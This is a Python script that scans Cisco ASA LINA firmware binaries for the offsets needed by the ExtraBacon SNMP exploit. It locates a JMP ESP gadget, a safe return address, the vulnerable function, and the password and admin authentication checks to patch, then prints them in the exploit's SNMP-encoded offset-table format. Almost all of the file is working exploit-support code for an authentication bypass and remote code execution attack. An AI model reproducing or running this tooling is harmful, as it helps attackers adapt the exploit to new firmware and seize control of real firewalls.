#!/usr/bin/env python2

"""
Finds ExtraBacon offsets in LINA.ELF files.
"""

import subprocess
import json
import binascii

LINA_FIND = """
[
  {
      "name": "JMPESP",

      "find": [
          "ff e4"
      ],
      "match": "ff e4",
      "type": "EXACT",
      "oneshot": true,
      "before": 0,
      "after": 0
  },
  {
      "name": "PMCHECK",

      "find": [
          "8b 75 08",
          "89 7d fc",
          "8b 16",
          "85 d2"
      ],
      "match": "55",
      "type": "BEFORE",
      "oneshot": false,
      "before": 0,
      "after": 2
  },
  {
      "name": "ADMAUTH",

      "find": [
          "c7 45 f0 01 00 00 00",
          "66 c7 45 ?? c1 10"
      ],
      "match": "55",
      "type": "BEFORE",
      "oneshot": false,
      "before": 0,
      "after": 2
  },
  {
        "name": "SAFE_RET",
        "find": [
            "8b 45 e4",
            "89 44 24 18",
            "8b 45 ??",
            "89 44 24 14",
            "8b 45 ec",
            "89 44 24 10",
            "8b ?? 10",
            "89 ?? 24 08",
            "89 ?? 24 0c",
            "8b ?? 14",
            "89 ?? 24 04",
            "8b ?? 18",
            "89 ?? 24",
            "e8 ?? ?? ff ff",
            "85 c0",
            "--",
            "a3 ?? ?? ?? ??",
            "0f 84 ?? ?? ?? ??"
        ],
        "match": "85 c0",
        "type": "AFTER",
        "oneshot": false,
        "before": 1,
        "after": 0
  }
  ,
  {
        "name": "VULNFUNC",
        "find": [
            "89 e5",
            "57",
            "56",
            "53",
            "83 ec 6c",
            "a1 ?? ?? ?? ??",
            "8b 5d 1c",
            "85 c0",
            "0f 84 ?? ?? ?? ??",
            "8b 03"
        ],
        "match": "55",
        "type": "BEFORE",
        "oneshot": false,
        "before": 0,
        "after": 0
  }

]
"""

class Finder(object):

    def __init__(self, fname):
        self.fname = fname
        self.sequences = []
        self._parse_instructions()

    def _parse_instructions(self):
        cmd = ["objdump", "-M", "intel", "-w", "-j", ".text", "-D", self.fname]
        ps = subprocess.Popen(cmd, stdout=subprocess.PIPE)
        output = ps.communicate()[0]

        self.instructions = []

        for line in output.split("\n"):
            line = line.split("\t")
            if len(line) != 3 or ":" not in line[0]:
                continue

            instruction = {}
            instruction["address"] = line[0].strip().replace(":", "")
            instruction["bytes"] = line[1].strip()
            instruction["operation"] = line[2].strip()

            self.instructions.append(instruction)

    def _check_wildcard(self, find_bytes, inst_bytes):
        find_bytes = find_bytes.split(" ")
        inst_bytes = inst_bytes.split(" ")

        if len(find_bytes) != len(inst_bytes):
            return False

        for x in range(0, len(find_bytes)):
            if find_bytes[x] == "??":
                continue

            if find_bytes[x] != inst_bytes[x]:
                return False

        return True

    def _find_match(self, i, sequence):
        import copy

        for x in range(0, len(sequence["find"])):
            find_bytes = sequence["find"][x]
            inst_bytes = self.instructions[i + x]["bytes"]

            if "--" in find_bytes:
                continue
            elif "??" in find_bytes:
                if not self._check_wildcard(find_bytes, inst_bytes):
                    return None
            elif find_bytes not in inst_bytes:
                return None

        if sequence['type'] == 'EXACT':
            ret = copy.deepcopy(sequence)
            ret['found'] = self.instructions[i - sequence['before'] : i + sequence['after'] + 1]
            return ret

        if sequence['type'] == 'BEFORE':
            search_range = range(i, 0, -1)
        else:
            search_range = range(i, len(self.instructions))

        for x in search_range:
            if sequence['match'] == self.instructions[x]['bytes']:
                ret = copy.deepcopy(sequence)
                ret['found'] = self.instructions[x - sequence['before'] : x + sequence['after'] + 1]
                return ret

        return None

    def search(self, jsondata):
        self.sequences = json.loads(jsondata)
        for i in range(0, len(self.instructions)):
            for sequence in self.sequences:
                match = self._find_match(i, sequence)
                if match is not None:
                    if sequence['oneshot']:
                        self.sequences.remove(sequence)

                    yield match

def hex_to_snmp(hex_str, convert_endian = True):
    if (len(hex_str) == 7):
        hex_str = "0" + hex_str
    #print hex_str
    hex = binascii.unhexlify(hex_str)

    if convert_endian:
        hex = reversed(hex)
    ret = ""
    for n in hex:
        ret += str(int(binascii.hexlify(n), 16))
        ret += "."

    ret = ret[:-1]
    return ret


# if you thought the above code was bad, get a load of this!
def post_auth_func(func):
    before_bytes = []

    for instr in func['found']:
        for byte in instr['bytes'].split(" "):
            if len(before_bytes) == 4:
                continue

            before_bytes.append(byte)

    before_bytes = "".join(before_bytes)

    addr = func['found'][0]['address']
    bounds = addr[:-3]
    bounds += "000"

    name = func['name'].lower()

    offset_snmp = hex_to_snmp(addr)
    bounds_snmp = hex_to_snmp(bounds)
    bytes_snmp = hex_to_snmp(before_bytes, False)

    print("%s_offset\t= \"%s\"\t\t# 0x%08x" % (name, hex_to_snmp(addr), int(addr, 16)))
    print("%s_bounds\t= \"%s\"\t\t# 0x%08x" % (name, hex_to_snmp(bounds), int(bounds, 16)))
    print("%s_code\t= \"%s\"\t\t# 0x%08x" % (name,hex_to_snmp(before_bytes, False), int(before_bytes, 16)))
    return offset_snmp, bounds_snmp, bytes_snmp

def post_process(results):
    vuln = [a for a in results if a['name'] == 'VULNFUNC'][0]['found'][0]['address']
    safes = [a for a in results if a['name'] == 'SAFE_RET']
    admauth = [a for a in results if a['name'] == 'ADMAUTH'][0]
    pmcheck = [a for a in results if a['name'] == 'PMCHECK'][0]
    jmpesp = [a for a in results if a['name'] == 'JMPESP'][0]

    for safe in safes:
        op =  safe['found'][0]['operation']
        #print("%s = %s?" % (vuln, op))
        if vuln in op:
            addr = safe['found'][1]['address']

            saferet_snmp = hex_to_snmp(addr)
            print("saferet_offset\t= \"%s\"\t\t# 0x%08x" % (hex_to_snmp(addr), int(addr, 16)))

    jmpesp_bytes = jmpesp['found'][0]['bytes'].split(" ")
    jmp_offset = 0
    for x in range(0, len(jmpesp_bytes)):
        if jmpesp_bytes[x] == "ff" and jmpesp_bytes[x + 1] == "e4":
            jmp_offset = x
            break

    jmp_esp_addr = int(jmpesp['found'][0]['address'], 16)
    jmp_esp_addr += jmp_offset
    jmp_esp_str = "%07x" % jmp_esp_addr
    print("jmp_esp_offset\t= \"%s\"\t\t# 0x%08x" % (hex_to_snmp(jmp_esp_str), jmp_esp_addr))

    adm_offset_snmp, adm_bounds_snmp, adm_bytes_snmp = post_auth_func(admauth)
    pm_offset_snmp, pm_bounds_snmp, pm_bytes_snmp = post_auth_func(pmcheck)

    print("fix_ebp\t= \"72\"\t\t# 0x48")

    """
              "9.2(3)" => ["29.112.29.8",      # jmp_esp_offset, 0
                           "134.115.39.9",     # saferet_offset, 1
                           "72",               # fix_ebp,        2
                           "0.128.183.9",      # pmcheck_bounds, 3
                           "16.128.183.9",     # pmcheck_offset, 4
                           "85.49.192.137",    # pmcheck_code,   5
                           "0.80.8.8",         # admauth_bounds, 6
                           "64.90.8.8",        # admauth_offset, 7
                           "85.137.229.87"],   # admauth_code,   8
    """
    jmp_snmp = hex_to_snmp(jmp_esp_str)
    offsets = (jmp_snmp, saferet_snmp, "72", pm_bounds_snmp, pm_offset_snmp, pm_bytes_snmp, adm_bounds_snmp, adm_offset_snmp, adm_bytes_snmp)
    print('#"VERS" => ["%s", "%s", "%s", "%s", "%s", "%s", "%s", "%s", "%s"]' % offsets)

if __name__ == '__main__':
    import sys

    try:
        f = Finder(sys.argv[1])
        matches = []
        for match in f.search(LINA_FIND):
            print(match)
            matches.append(match)

        post_process(matches)

    except IndexError:
        print("Usage: %s lina_file" % sys.argv[0])
